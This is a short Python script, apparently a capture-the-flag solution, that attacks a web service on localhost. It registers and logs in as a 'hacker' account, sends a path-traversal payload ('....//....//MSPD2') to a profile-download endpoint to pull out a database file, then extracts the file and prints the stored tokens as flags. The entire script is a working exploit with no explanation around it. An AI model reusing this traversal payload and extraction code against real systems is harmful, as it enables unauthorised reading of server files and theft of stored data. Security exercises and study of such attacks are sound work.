import requests
import zipfile
import io
import sqlite3

url = "http://localhost:1015"
hacker_creds = {'username':'1m4h4ck3rr','password':'Level123'}

s = requests.Session()
req = s.post(url+"/register", hacker_creds)
req = s.post(url+"/authorize", hacker_creds)
req = s.post(url+"/download_profile", data={"ID":"....//....//MSPD2","ext":".db"})

with zipfile.ZipFile(io.BytesIO(req.content)) as z:
    z.extract('sus0.db', path='.')
conn = sqlite3.connect('sus0.db')
cursor = conn.cursor()
cursor.execute("SELECT sbertoken FROM suspects")
flags = cursor.fetchall()
for flag in flags:
    print(flag[0])
